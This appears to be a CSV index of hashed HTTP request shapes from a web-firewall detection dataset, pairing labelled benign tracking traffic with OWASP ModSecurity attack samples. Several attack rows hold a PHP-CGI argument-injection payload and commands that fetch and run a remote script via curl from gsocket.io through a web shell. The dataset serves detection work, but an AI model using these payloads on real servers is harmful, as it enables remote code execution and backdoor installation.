"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"endpoint_shape_hash","2afcf823b8c0af060ce8fc82","12","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000911|norm_modsec_learn_000909|norm_modsec_learn_000913|norm_modsec_learn_000910|norm_modsec_learn_000906|norm_modsec_learn_000902|norm_modsec_learn_000908|norm_modsec_learn_000907|norm_modsec_learn_000904|norm_modsec_learn_000912","GET","/","q=tbn:ANd9GcTTF1d-N0fpjpx6epTxgR3-WAtuNcZEafce06kTq95x2tsvPm5vz3AOQJY2jOwft6qwVK0&usqp=CAU"
"endpoint_shape_hash","72f8cb06226842f7f9c77751","12","1","owasp_modsecurity","owasp_php_injection:933120","pos_owasp_modsec_001297|pos_owasp_modsec_002216|pos_owasp_modsec_002067|pos_owasp_modsec_000008|pos_owasp_modsec_001292|pos_owasp_modsec_000693|pos_owasp_modsec_000508|pos_owasp_modsec_001384|pos_owasp_modsec_002745|pos_owasp_modsec_001738","GET","/d_442cf7a4/php-cgi.exe","%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
"endpoint_shape_hash","7863dfbf1f99fc0fc9f6a0d9","12","0","openappsec_legitimate","normal","norm_legitimate_000881|norm_legitimate_000848|norm_legitimate_001460|norm_legitimate_000938|norm_legitimate_001465|norm_legitimate_000865|norm_legitimate_000839|norm_legitimate_000871|norm_legitimate_001455|norm_legitimate_001175","POST","/horizon/adidasgroup","T=B&u=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&t=1719747531856&v=1719747558533&H=ce438166b0e4c00cb2fc2417&s=aa3bbc1a791d8c7348e559873f77a0d2&S=42174&N=76&P=6&z=1"
"endpoint_shape_hash","18d5e63aed65dba236e5667a","11","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001546|norm_modsec_learn_001545|norm_modsec_learn_001537|norm_modsec_learn_001538|norm_modsec_learn_001453|norm_modsec_learn_001548|norm_modsec_learn_000919|norm_modsec_learn_001554|norm_modsec_learn_000315|norm_modsec_learn_001536","GET","/","random=623061315&cv=9&fst=1660632489673&num=1&npa=1&label=vf7ECKya1_kCELm7psAC&guid=ON&resp=GooglemKTybQhCsO&eid=375603261&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=9&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F9731995.fls.doubleclick.net%2Factivityi%3Bdc"
"endpoint_shape_hash","1be52b43713e7cda1189e813","11","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002810|norm_modsec_learn_002814|norm_modsec_learn_002242|norm_modsec_learn_001049|norm_modsec_learn_001047|norm_modsec_learn_000502|norm_modsec_learn_000509|norm_modsec_learn_002220|norm_modsec_learn_001042|norm_modsec_learn_002215","GET","/","v=1&_v=j96&a=1675711593&t=pageview&_s=1&dl=https%3A%2F%2Fwww.xplorer.co.il%2Ftmarket%2Fhotel%2F1298074%2Fsouth_palm_resort_maldives%3Ftoken%3DYWNjX2xldmVsPTA7YWNjX3R5cGU9MDtjaGVja2luX2RhdGU9MjAyMi0wOC0xMjtjaGVja291dF9kYXRlPTIwMjItMDgtMjM7aXNfbW9iaWxlPTA7bGF0ZV9jaGVja2luPTA7bG9jX2lkPTIxODc5OTtsb2NfdH"
"endpoint_shape_hash","1fa8076586cf182ca14f9d01","11","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001362|norm_modsec_learn_002529|norm_modsec_learn_000821|norm_modsec_learn_001937|norm_modsec_learn_000815|norm_modsec_learn_002530|norm_modsec_learn_001936|norm_modsec_learn_000822|norm_modsec_learn_000814|norm_modsec_learn_001360","GET","/","id=G-EZDM0TQ1LB&l=dataLayer&cx=c"
"endpoint_shape_hash","2383911cf0ed1cd08ee212da","11","0","openappsec_legitimate","normal","norm_legitimate_001583|norm_legitimate_001573|norm_legitimate_001586|norm_legitimate_001569|norm_legitimate_001588|norm_legitimate_001590|norm_legitimate_001656|norm_legitimate_001587|norm_legitimate_001655|norm_legitimate_001584","POST","/experienceedge/sgp3/v1/interact","configId=0fd7a243-507d-4035-9c75-e42e42f866a0&requestId=906a692d-1d1d-4a99-b747-ae55b975765d"
"endpoint_shape_hash","40a6636cb8aa667120a8890c","11","0","openappsec_legitimate","normal","norm_legitimate_002380|norm_legitimate_002384|norm_legitimate_002366|norm_legitimate_002367|norm_legitimate_002382|norm_legitimate_002374|norm_legitimate_002348|norm_legitimate_002383|norm_legitimate_002385|norm_legitimate_002381","POST","/af",""
"endpoint_shape_hash","577fe304591db3bda2cee98d","11","0","openappsec_legitimate","normal","norm_legitimate_000351|norm_legitimate_000363|norm_legitimate_000335|norm_legitimate_000334|norm_legitimate_000433|norm_legitimate_000336|norm_legitimate_000337|norm_legitimate_000349|norm_legitimate_000362|norm_legitimate_000350","GET","/api/bff/customer","storeId=11203&catalogId=10901&langId=-1&brand=anf&store=a-wd&country=IL&responseFormat=raw&operationName=SIGN_IN_FORM_QUERY&variables=%7B%7D&extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22b245e2208edd4669f8fed46a1aa80c44df8efac435ef483c95bae5b6155ebdf6%22%7D%7D"
"endpoint_shape_hash","713b6f553816cf34934fb0f1","11","0","openappsec_legitimate","normal","norm_legitimate_000814|norm_legitimate_001518|norm_legitimate_001275|norm_legitimate_001200|norm_legitimate_001262|norm_legitimate_001082|norm_legitimate_001426|norm_legitimate_001121|norm_legitimate_001330|norm_legitimate_001520","GET","/track","action=conversion&env=js-web&tag_version=6.18.0_524f5eb&provider=tag&conversion_type=ViewContent&aepn=pageView&advertiser_id=10786&referer=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&user_session_id=5f891efa-1fa1-4c15-a7b6-84b601a599dc"
"endpoint_shape_hash","949dcbae11dc107ef6ce9cc5","11","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002688|norm_modsec_learn_002687|norm_modsec_learn_001511|norm_modsec_learn_002659|norm_modsec_learn_002082|norm_modsec_learn_001476|norm_modsec_learn_002083|norm_modsec_learn_002089|norm_modsec_learn_000340|norm_modsec_learn_000343","GET","/","random=1660648022511&cv=9&fst=1660647600000&num=1&bg=ffffff&guid=ON&eid=376635470&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=26&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg8f0&sendb=1&frm=0&url=https%3A%2F%2Ftoysrus.co.il%2Fpuzzle-and-creation%2Fpuzzle.html%3Fseries%3D22500&ref=https%3"
"endpoint_shape_hash","9bf81b6cff85bd1f4ebeca40","11","0","openappsec_legitimate","normal","norm_legitimate_002901|norm_legitimate_002834|norm_legitimate_002950|norm_legitimate_002835|norm_legitimate_002991|norm_legitimate_002866|norm_legitimate_002902|norm_legitimate_002993|norm_legitimate_002867|norm_legitimate_002947","GET","/api/ship/read","_=1728488067062&callback=jsonp_1728488067062_28243"
"endpoint_shape_hash","b4809ece6cddf13e74828c30","11","0","openappsec_legitimate","normal","norm_legitimate_001277|norm_legitimate_000968|norm_legitimate_000923|norm_legitimate_001145|norm_legitimate_001013|norm_legitimate_000808|norm_legitimate_001248|norm_legitimate_001118|norm_legitimate_001414|norm_legitimate_001340","GET","/action/0","ti=5713812&Ver=2&mid=2edd5421-c3fa-44a8-8d9e-3c773f9174f1&sid=51cd976036d511ef88680dd62cd4e68e&vid=51cde72036d511efb6de350517090e1b&vids=0&msclkid=N&gc=USD&pagetype=product&p=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html&sw=1920&sh=1080&sc=24&evt=custom&rn=296786"
"endpoint_shape_hash","be000fade9309bbb404676a8","11","0","openappsec_legitimate","normal","norm_legitimate_001326|norm_legitimate_001517|norm_legitimate_001204|norm_legitimate_001266|norm_legitimate_001516|norm_legitimate_000818|norm_legitimate_001428|norm_legitimate_001078|norm_legitimate_001117|norm_legitimate_001287","GET","/v3/conversion","action=conversion&env=js-web&tag_version=6.18.0_524f5eb&provider=tag&conversion_type=AddToCart&aepn=Add%20to%20Cart&advertiser_id=10786&referer=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html%3FforceSelSize%3D6.5&user_session_id=5f891efa-1fa1-4c15-a7b6-84b601a599dc"
"endpoint_shape_hash","24d6f768fb61270b5caed472","10","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000950|norm_modsec_learn_000953|norm_modsec_learn_000954|norm_modsec_learn_000958|norm_modsec_learn_000955|norm_modsec_learn_000949|norm_modsec_learn_000957|norm_modsec_learn_000948|norm_modsec_learn_000961|norm_modsec_learn_000943","GET","/","random=1662471034898&cv=9&fst=1662469200000&num=1&userId=abHGpfkc9x3pzSOggiueVAf24h&bg=ffffff&guid=ON&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa8v0&sendb=1&data=event%3Dgtag.config&frm=0&url=https%3A%2F%2Fwww.crocs.co.uk%2F&ref=https%3A%2F%2"
"endpoint_shape_hash","2fe899f24e4964eed09d90a1","10","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000974|norm_modsec_learn_000980|norm_modsec_learn_000978|norm_modsec_learn_000977|norm_modsec_learn_000415|norm_modsec_learn_000975|norm_modsec_learn_000976|norm_modsec_learn_000416|norm_modsec_learn_000979|norm_modsec_learn_000417","GET","/","rt=5&v=11.40.1&pid=23504&uu=d3973808-b504-a5a7-b0f0-25374fc648c8&sn=1&pn=3&ri=11&rst=1662471035075&let=1662471086356&enc=lzstring"
"endpoint_shape_hash","30a64403de2fc5f2b80eb63c","10","0","openappsec_legitimate","normal","norm_legitimate_001464|norm_legitimate_001513|norm_legitimate_001486|norm_legitimate_001527|norm_legitimate_001560|norm_legitimate_001476|norm_legitimate_001441|norm_legitimate_001496|norm_legitimate_001479|norm_legitimate_001383","POST","/events",""
"endpoint_shape_hash","3a95e1124f0ac531395bdeb0","10","0","openappsec_legitimate","normal","norm_legitimate_001996|norm_legitimate_002180|norm_legitimate_002055|norm_legitimate_002408|norm_legitimate_002146|norm_legitimate_002608|norm_legitimate_002054|norm_legitimate_002318|norm_legitimate_002147|norm_legitimate_002320","GET","/g/s/collect","dma=0&gtm=45j91e4731v886006994z8851582372z9846913331za200zb851582372&_gsid=T408Z268D2nNpTcEBnQw5JfVOvVrkemQ"
"endpoint_shape_hash","40a8601d978f089611f62d0e","10","1","owasp_modsecurity","owasp_rce:932130|owasp_rce:932150","pos_owasp_modsec_001342|pos_owasp_modsec_002398|pos_owasp_modsec_000557|pos_owasp_modsec_001291|pos_owasp_modsec_000334|pos_owasp_modsec_001949|pos_owasp_modsec_000132|pos_owasp_modsec_001902|pos_owasp_modsec_001240|pos_owasp_modsec_001469","GET","/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"endpoint_shape_hash","6580b9236a1edfc4b27164d7","10","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002834|norm_modsec_learn_000526|norm_modsec_learn_002258|norm_modsec_learn_002260|norm_modsec_learn_001667|norm_modsec_learn_002257|norm_modsec_learn_002835|norm_modsec_learn_002259|norm_modsec_learn_002261|norm_modsec_learn_002255","GET","/","v=1&t=sr&slf_rd=1&_r=4&tid=G-2KJ26CX23C&cid=677208334.1660545355&gtm=2oe880&aip=1&z=1368355305"
"endpoint_shape_hash","a66f3ea123a97e24e03d6527","10","0","openappsec_legitimate","normal","norm_legitimate_001718|norm_legitimate_001711|norm_legitimate_001674|norm_legitimate_001727|norm_legitimate_001762|norm_legitimate_001778|norm_legitimate_001744|norm_legitimate_001723|norm_legitimate_001740|norm_legitimate_001780","GET","/customer/section/load/","sections=messages&force_new_section_timestamp=true&_=1728347352962"
"endpoint_shape_hash","d133df046d657f20bd0545bc","10","0","openappsec_legitimate","normal","norm_legitimate_000016|norm_legitimate_000042|norm_legitimate_000033|norm_legitimate_000030|norm_legitimate_000038|norm_legitimate_000015|norm_legitimate_000037|norm_legitimate_000034|norm_legitimate_000032|norm_legitimate_000028","GET","/r/api/aggregator/graphql","query=%7B%20findURL(%20brand%3A%20%221800flowers%22%20locale%3A%20%22en-us%22%20environment%3A%20%22production%22%20path%3A%20%22%2F%22%20)%20%7B%20contentType%20type%20commerceURL%20code%20uid%20vanity%20%7B%20url%20redirectType%20bannerCode%20__typename%20%7D%20bannerCode%20%7B%20content%20__typen"
"endpoint_shape_hash","1735ed5fcf2a305ff945d8d8","9","0","openappsec_legitimate","normal","norm_legitimate_001010|norm_legitimate_001525|norm_legitimate_001119|norm_legitimate_001241|norm_legitimate_001138|norm_legitimate_001341|norm_legitimate_001404|norm_legitimate_000813|norm_legitimate_001291","GET","/c2/10973357/track_page_view","payload=%7B%22category%22%3A%22PLP%22%2C%22title%22%3A%22adidas%20Grand%20Court%202.0%20Shoes%20Kids%20-%20White%20%7C%20Kids%27%20Lifestyle%20%7C%20adidas%20US%22%2C%22url%22%3A%22https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%22%2C%22referrer%22%3A%22%22%2C%22user_inf"
"endpoint_shape_hash","28fe9b87583399a57353e89d","9","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_000366|pos_owasp_modsec_000340|pos_owasp_modsec_001768|pos_owasp_modsec_001445|pos_owasp_modsec_000694|pos_owasp_modsec_001887|pos_owasp_modsec_000067|pos_owasp_modsec_000829|pos_owasp_modsec_000335","GET","/wp-includesSimplePiegzdecodes.php",""
"endpoint_shape_hash","5da50e39f6d41c9a937ee5c1","9","0","openappsec_legitimate","normal","norm_legitimate_001356|norm_legitimate_001178|norm_legitimate_001456|norm_legitimate_001462|norm_legitimate_001355|norm_legitimate_000850|norm_legitimate_001443|norm_legitimate_001199|norm_legitimate_001466","POST","/horizon/adidasgroup","T=B&u=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html%3FforceSelSize%3D6.5&t=1719747633322&v=1719747640157&H=32448166a41fcc9372b2ddc5&s=aa3bbc1a791d8c7348e559873f77a0d2&Q=2&S=4147&N=2&z=1"
"endpoint_shape_hash","6166c2c2e13d89789dc753dd","9","1","owasp_modsecurity","owasp_sqli:933160|owasp_sqli:942100","pos_owasp_modsec_000450|pos_owasp_modsec_000822|pos_owasp_modsec_001574|pos_owasp_modsec_000561|pos_owasp_modsec_001064|pos_owasp_modsec_001129|pos_owasp_modsec_001687|pos_owasp_modsec_001642|pos_owasp_modsec_000173","POST","/d_7dd3b010",""
"endpoint_shape_hash","7b1a3346f2c23f6900ab6eb0","9","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001524|norm_modsec_learn_000386|norm_modsec_learn_001507|norm_modsec_learn_001525|norm_modsec_learn_000387|norm_modsec_learn_000956|norm_modsec_learn_001523|norm_modsec_learn_001521|norm_modsec_learn_002666","GET","/","random=1662450307477&cv=9&fst=1662450307477&num=1&npa=1&label=LYJzCNXEwusBELi-itUC&guid=ON&resp=GooglemKTybQhCsO&eid=375603261&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=6&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F3801950.fls.doubleclick.net%2Factivityi%3B"
"endpoint_shape_hash","9583d16f4cd60ad194e3f7f2","9","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001788|norm_modsec_learn_001189|norm_modsec_learn_001793|norm_modsec_learn_001798|norm_modsec_learn_001797|norm_modsec_learn_001178|norm_modsec_learn_000059|norm_modsec_learn_001795|norm_modsec_learn_001787","GET","/","a=129738900&v=1216.487a282&to=ZFZVMBBYWhFZW0VRC10cchwSS1ERS1JCFyN2ZxhLSA%3D%3D&rst=65356&ck=1&ref=https://www.realtor.com/realestateandhomes-detail/3377-Johannesberg-Rd_North-Port_FL_34288_M55010-61389"
"endpoint_shape_hash","a3b8435d5d23f5fb5f6cd9fc","9","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000686|norm_modsec_learn_002388|norm_modsec_learn_000090|norm_modsec_learn_002389|norm_modsec_learn_000687|norm_modsec_learn_002390|norm_modsec_learn_000091|norm_modsec_learn_000689|norm_modsec_learn_000688","GET","/","cb=1663165315629"
"endpoint_shape_hash","ddc1136f4ca9d7a3f2315912","9","1","csic_2010","csic_anomalous","pos_csic_000824|pos_csic_000796|pos_csic_002284|pos_csic_001145|pos_csic_002910|pos_csic_002630|pos_csic_002649|pos_csic_001966|pos_csic_002904","GET","/tienda1/publico/entrar.jsp","errorMsgA=Credenciales+incorrectas"
"endpoint_shape_hash","df9e020733e56e17f98af71f","9","0","openappsec_legitimate","normal","norm_legitimate_001171|norm_legitimate_001294|norm_legitimate_001196|norm_legitimate_001288|norm_legitimate_001431|norm_legitimate_001190|norm_legitimate_001289|norm_legitimate_001290|norm_legitimate_001067","GET","/horizon/adidasgroup","QUANTUM_WARNING=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&hit=1644816663b7dcdde3942fc7&s=aa3bbc1a791d8c7348e559873f77a0d2&CORS_LINK=https%3A%2F%2Fwww.contactus.adidas.com%2FadidasContact%2Fservlet%2Fservlet.FileDownload%3Ffile%3D0150O00000453b1%"
"endpoint_shape_hash","ea9591a7ffc31b9079c93ff6","9","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002748|norm_modsec_learn_000457|norm_modsec_learn_000450|norm_modsec_learn_002183|norm_modsec_learn_000997|norm_modsec_learn_002170|norm_modsec_learn_002745|norm_modsec_learn_002754|norm_modsec_learn_002174","GET","/","t=1650446775971"
"endpoint_shape_hash","03a019b642314b7d3604c098","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000344|norm_modsec_learn_002090|norm_modsec_learn_000347|norm_modsec_learn_000934|norm_modsec_learn_000346|norm_modsec_learn_000935|norm_modsec_learn_002667|norm_modsec_learn_000351","GET","/","random=1660562072443&cv=9&fst=1660562072443&num=1&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=9&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg880&sendb=1&ig=1&frm=0&url=https%3A%2F%2Fwww.ace.co.il%2Fcheckout&ref=https%3A%2F%2Fwww.ace.co.il%2Fedea%2F"
"endpoint_shape_hash","054500dc9277de6b30e4bb5f","8","0","openappsec_legitimate","normal","norm_legitimate_000910|norm_legitimate_001501|norm_legitimate_001451|norm_legitimate_001490|norm_legitimate_001405|norm_legitimate_000789|norm_legitimate_000962|norm_legitimate_001522","GET","/track/up","adv=ygdrgdy&ref=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&upid=186z53b&upv=1.1.0&vf=USD&TD1=GLP|KIDS&TD9=&Geo=US&TD10=3&paapi=1"
"endpoint_shape_hash","060ba049e8bebdf6cecd04dc","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001455|norm_modsec_learn_001459|norm_modsec_learn_001551|norm_modsec_learn_001544|norm_modsec_learn_001457|norm_modsec_learn_001541|norm_modsec_learn_001553|norm_modsec_learn_001552","GET","/","random=105248274&cv=9&fst=1662450223622&num=1&npa=1&label=faEVCOqfwuoBELi-itUC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F3801950.fls.doubleclick.net%2Factivityi%3Bdc_p"
"endpoint_shape_hash","06fa2930a22ce75de7628a80","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001494|norm_modsec_learn_002106|norm_modsec_learn_000326|norm_modsec_learn_002063|norm_modsec_learn_002115|norm_modsec_learn_000320|norm_modsec_learn_000321|norm_modsec_learn_001483","GET","/","random=1660566301666&cv=9&fst=1660566301666&num=1&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa880&sendb=1&ig=1&data=event%3Dgtag.config&frm=0&url=https%3A%2F%2Fwww.kaza.co.il%2Fproduct%2F%25D7%259E%25D"
"endpoint_shape_hash","2aefca43f4289c1ec35a90e6","8","0","openappsec_legitimate","normal","norm_legitimate_000156|norm_legitimate_000109|norm_legitimate_000198|norm_legitimate_000214|norm_legitimate_000162|norm_legitimate_000147|norm_legitimate_000130|norm_legitimate_000097","GET","/a/4/28b1a41b/z","ref=https%3A//www.4shared.com/&url=https%3A//www.4shared.com/web/login%3FsId%3DR133wSLlVC4mX2xg%26fau%3D1%26ausk%3DR133wSLlVC4mX2xg%26au%3D1&rand=0.368510540137833"
"endpoint_shape_hash","43e266181c0bd6bad0f77c43","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000024|norm_modsec_learn_000029|norm_modsec_learn_001151|norm_modsec_learn_000025|norm_modsec_learn_000026|norm_modsec_learn_000028|norm_modsec_learn_001150|norm_modsec_learn_000031","GET","/","IG=04865C4E4B62411CBB4F242ECC97434D&TYPE=Event.ClientInst&DATA=%5B%7B%22MouseEventId%22%3A%22da48e91e-2854-a76b-f51c-0c469fdcd107%22%2C%22T%22%3A%22CI.RqnaAnswerCardMouseEvent%22%2C%22TS%22%3A1663161830250%2C%22Name%22%3A%22UserMouseEnter%22%2C%22FID%22%3A%22Rqna.Answer.Card.MouseEnter%22%7D%2C%7B%2"
"endpoint_shape_hash","47c987d908dc47f70e013e00","8","0","openappsec_legitimate","normal","norm_legitimate_000809|norm_legitimate_001419|norm_legitimate_000810|norm_legitimate_001261|norm_legitimate_001064|norm_legitimate_001063|norm_legitimate_001260|norm_legitimate_001421","GET","/track","action=browser-topics&env=js-web&tag_version=6.18.0_524f5eb&provider=tag&advertiser_id=10786&referer=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&user_session_id=5f891efa-1fa1-4c15-a7b6-84b601a599dc"
"endpoint_shape_hash","73f5bcedf7397e64bae90deb","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001327|norm_modsec_learn_000169|norm_modsec_learn_000163|norm_modsec_learn_001339|norm_modsec_learn_000166|norm_modsec_learn_000164|norm_modsec_learn_001906|norm_modsec_learn_000805","GET","/","id=2161118790799860&ev=Microdata&dl=https%3A%2F%2Ftix.hotcinema.co.il%2FASHK%2FCustomer%2FLoginOrRegister.aspx%3Fdtticks%3D637960869875590313%26ec%3D42873%26hideBackButton%3D1&rl=https%3A%2F%2Fhotcinema.co.il%2F&if=false&ts=1660479387386&cd[DataLayer]=%5B%5D&cd[Meta]=%7B%22title%22%3A%22%5Cn%5CtSele"
"endpoint_shape_hash","74f8e58a860c7c497aa0a783","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000246|norm_modsec_learn_000252|norm_modsec_learn_002546|norm_modsec_learn_002544|norm_modsec_learn_000250|norm_modsec_learn_000248|norm_modsec_learn_002543|norm_modsec_learn_000245","GET","/","k=2847deb3b150d09d35c078cd3db49f5fbf6e378074161818340c9ad8e27768c5&o="
"endpoint_shape_hash","7d5a8a3f6cd36f482a44f6d2","8","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002038|pos_owasp_modsec_002379|pos_owasp_modsec_001972|pos_owasp_modsec_001408|pos_owasp_modsec_002063|pos_owasp_modsec_001771|pos_owasp_modsec_001251|pos_owasp_modsec_000015","GET","/d_42a4d7a0/d_3e6ca509/webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"endpoint_shape_hash","a78d34fce7995a435cdb706e","8","0","openappsec_legitimate","normal","norm_legitimate_000921|norm_legitimate_000919|norm_legitimate_000828|norm_legitimate_001092|norm_legitimate_001146|norm_legitimate_000830|norm_legitimate_001157|norm_legitimate_001090","GET","/pagead/viewthroughconversion/986797384/","random=1719747572824&cv=11&fst=1719747572824&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&hn=www.googleadservices.com&frm=0&tiba=%F0%9F%91%95Kids%27%20Shoes%20and%20Clothing%20%7C%20adidas%20US%F0"
"endpoint_shape_hash","b048378cabe483572670fc9e","8","0","openappsec_legitimate","normal","norm_legitimate_000915|norm_legitimate_000920|norm_legitimate_001150|norm_legitimate_000827|norm_legitimate_000829|norm_legitimate_001177|norm_legitimate_001161|norm_legitimate_001176","GET","/td/rul/986797384","random=1719747572791&cv=11&fst=1719747572791&fmt=3&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&hn=www.googleadservices.com&frm=0&tiba=%F0%9F%91%95Kids%27%20Shoes%20and%20Clothing%20%7C%20adidas%2"
"endpoint_shape_hash","b061dce08c15e7925a47a435","8","0","openappsec_legitimate","normal","norm_legitimate_001185|norm_legitimate_001072|norm_legitimate_001444|norm_legitimate_000855|norm_legitimate_001425|norm_legitimate_001259|norm_legitimate_001352|norm_legitimate_000812","GET","/v3/conversion","action=timeSpent10&env=js-web&tag_version=6.18.0_524f5eb&provider=tag&advertiser_id=10786&referer=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&user_session_id=5f891efa-1fa1-4c15-a7b6-84b601a599dc"
"endpoint_shape_hash","b4c91c4bc5def5f676c43bcc","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002293|norm_modsec_learn_000548|norm_modsec_learn_001094|norm_modsec_learn_000554|norm_modsec_learn_000550|norm_modsec_learn_001711|norm_modsec_learn_001097|norm_modsec_learn_002294","GET","/","v=2&tid=G-KV7HH65FLP&gtm=2oe880&_p=10528196&cid=1339067807.1660223466&ul=en-us&sr=1920x1080&_z=ccd.v9B&_s=2&sid=1660223466&sct=1&seg=1&dl=https%3A%2F%2Fshoesonline.co.il%2Fmy-account%2F%3FnewUserRegistered&dr=https%3A%2F%2Fshoesonline.co.il%2Fmy-account%2F&dt=%D7%94%D7%97%D7%A9%D7%91%D7%95%D7%9F%20%"
